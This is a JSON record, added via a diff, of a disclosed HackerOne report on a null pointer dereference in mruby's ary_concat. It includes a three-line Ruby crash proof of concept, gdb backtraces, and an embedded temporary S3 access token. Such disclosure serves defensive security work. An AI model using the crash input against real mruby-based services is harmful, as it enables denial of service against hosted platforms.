@@ -1,0 +1,200 @@
+{
+  "id": 214681,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2ODE=",
+  "url": "https://hackerone.com/reports/214681",
+  "title": "Null pointer dereference in ary_concat ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-19T15:38:46.502Z",
+  "submitted_at": "2017-03-19T15:38:46.502Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dgaletic",
+    "url": "/dgaletic",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-04-15T14:44:57.417Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-15T14:44:57.376Z",
+  "team_member_agreed_on_going_public_at": "2017-04-13T21:30:50.930Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n===\nThe following demonstrates a crash:\n\n    def f\n    end\n    [][*@a] = f &:s\n    \nDebug info\n==========\nmruby crashes in array.c:260 due to a null pointer dereference.\n\n    256│ ary_concat(mrb_state *mrb, struct RArray *a, struct RArray *a2)\n    257│ {\n    258│   mrb_int len;\n    259│\n    260├>  if (a2->len > ARY_MAX_SIZE - a->len) {\n    261│     mrb_raise(mrb, E_ARGUMENT_ERROR, \"array size too big\");\n\n    (gdb) p a \n    $2 = (struct RArray *) 0x0\n    \n    (gdb) bt\n    #0  0x0000000000402eff in ary_concat (mrb=0x6af010, a=0x0, a2=0x6b1290) at /home/user/repos/mruby/src/array.c:260\n    #1  0x0000000000403021 in mrb_ary_concat (mrb=0x6af010, self=..., other=...) at /home/user/repos/mruby/src/array.c:279\n    #2  0x000000000042228a in mrb_vm_exec (mrb=0x6af010, proc=0x6b13b0, pc=0x718c14) at /home/user/repos/mruby/src/vm.c:2288\n    #3  0x000000000041b6d6 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:823\n    #4  0x0000000000423ad8 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:2614\n    #5  0x0000000000444ac0 in mrb_load_exec (mrb=0x6af010, p=0x70ce90, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n    #6  0x0000000000444b56 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cad0, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n    #7  0x0000000000402415 in main (argc=2, argv=0x7fffffffdbc8) at /home/user/repos/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\n    \nmruby-engine crashes in vm.c:1210 (`CASE(OP_SEND)`).\n\n    1210├>      m = mrb_method_search_vm(mrb, &c, mid)\n        \n    (gdb) bt\n    #0  mrb_vm_exec (mrb=mrb@entry=0x7ffff2ba74e0, proc=proc@entry=0x7ffff2baec90, pc=0x7ffff2c05f44) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1210\n    #1  0x00007ffff4043392 in mrb_vm_run (mrb=0x7ffff2ba74e0, proc=0x7ffff2baec90, self=..., stack_keep=stack_keep@entry=0) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby\n    /src/vm.c:820\n    #2  0x00007ffff4018b4e in mruby_engine_monitored_eval (data=0x7ffff2ba73e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n    #3  0x00007ffff7bc4184 in start_thread (arg=0x7ffff2ba6700) at pthread_create.c:312\n    #4  0x00007ffff6f3a37d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\nTest platform\n=============\n* Arch Linux, updated as of today (2017-03-19)\n* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)\n\nmruby SHA: cea6a16cf41b5268a0ad38d1c6ab3140e375f0f3\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f\n\nThank you,\nDinko Galetic\nDenis Kasak",
+  "bounty_amount": "800.0",
+  "formatted_bounty": "$800",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 169982,
+      "file_name": "poc",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/982/aaeace85a320927983aa829749cbaca93f354e50/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DK7BU5K%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T063811Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDm5UkcianOVpT2dxHhYUFO2JJdi4xaD9w6djVtBYZASwIhANXZxm2j8oHu%2BP%2BkAqbXzU%2BKecKpDIQFUssbVExx7Jy5KrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgyDTl7d7vVnsdqLgOAqjwXnNXnYKYav0zdjYTPkVRXer%2FMwN2oqqrhfdNURd9ubM1WAp9zualVU2sWPVBIzAzLyEBUvF32oYKbsmEdMz%2BOT5tIYlVUJP9uinYkvmcDgFv1NCgizwcinvUA%2BHioTSSP4Ept1%2FunQf62b6n9qtxNg4QoI1qyNKlZwa2F%2BA2clysHg54E8gPBIN4HLgNM3XGdb9eIFBQTPjRZP9zgDoCXlGlHuXgZp%2BGqrlss1lhSSEXeoHrCkNL%2BR9iWEYXgUxQNv80lJqNIufItu8Xib6HzyanXoOdF1TwuPiZygndvcAnqOFJO%2BLGSt95CXOfYjNz05uh%2FJLWUKJ9mmbgQOogRg%2Fs2m7kwJHmdBPpZxRsrzqQpevupufGCO5jxvuWzrkegVMUQJkroi1nizwO3JrNfVc1LtNJVEGTmzxLPer8BP7S%2BTwq6%2F%2BoBd2pZ%2BclexBVvVdsgQTZJnAcLwV5YksWtqa5q5h7Vi%2B2lL9x0Vcm2F80oL8MY39N6URu14%2FV0ZvVUmSWNQBCMJverUPgwSJxE5fjHFqF%2FIYAymddI6rxUW3rVIgkfnPkQrqdiTGptQBVoXxU9dPVcB8t9tHN%2BtgGb%2BsR99jQOf%2B47DiVknLWL%2Fbe1P4syd3fDk5zERd%2FP3ALBU%2ByhXSN4pJ2Zbja7BSIHu356PYgNjzf8xQViKbGv2ldsZPrfJemVsIcCXL%2FZRC9%2BW%2Fm1G46AcgTwfyKyT8TmAF02MN01xoLloQiEohc%2BajN85Vnf2t%2FBXqkSkPmsLA1h0d%2BHLuMxR41Rk%2FGrJ6jk6l%2FemaRaTx%2FjrImK6LS6WTf%2Bz9nPEokZUR90uDg%2FJ5KxZnRXz8m7KUTsbjmIvjDvgYc%2FVAirPdFnU0pwvkoIcMK7Ht9IGOrAB9OAuM4ZuS7Ot0zodh6zUVsVU9aMBJovCDTfF8yFDXiVotiEC8Lmus9gNBc%2FOkg5EWNMF%2FNXeiPj8ndunzDi1Uo0Qdl%2BD73Qy2AkoASEWajogjtRYdbBnDNt8yYBaMFzSQlLBFWUZjt0ZUowCPDUmrFKmTgtpfrHbcPh2bgJbG5wTsKIBKJVo7EbjLXawp7VOziqIlCPyh9ctyqpWxvP7sVo3U0ZgwfbNyEUQ%2F31RTrY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e4636d3d5d4dec34e1372686248e7c6723904a21cf590f76644cd904b8e4112",
+      "file_size": 26,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-05-13T21:30:50.957Z",
+  "allow_singular_disclosure_after": -288781640.45570904,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "dgaletic",
+    "michiel",
+    "eveeez",
+    "linkks",
+    "spetr0x",
+    "fathy",
+    "adiet7579"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "214681",
+  "votes": 7,
+  "latest_disclosable_activity_at": "2017-04-15T14:44:57.432Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:38:11.540119",
+    "source": "https://hackerone.com/reports/214681.json",
+    "report_id": 214681
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2ODE=",
+    "databaseId": "214681",
+    "title": "Null pointer dereference in ary_concat ",
+    "url": "https://hackerone.com/reports/214681",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-04-15T14:44:57.417Z",
+    "created_at": "2017-03-19T15:38:46.502Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzUx",
+      "name": "NULL Pointer Dereference",
+      "external_id": "cwe-476"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "dgaletic"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80NTQ4NA==",
+            "amount": "800.00",
+            "awarded_amount": "800.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-04-11T22:39:57.873Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzIxNDY4MQ==",
+    "_id": "214681",
+    "disclosed": true,
+    "votes": 7,
+    "latest_disclosable_activity_at": "2017-04-15T14:44:57.432Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2ODE=",
+      "databaseId": "214681",
+      "title": "Null pointer dereference in ary_concat ",
+      "url": "https://hackerone.com/reports/214681",
+      "disclosed_at": "2017-04-15T14:44:57.417Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
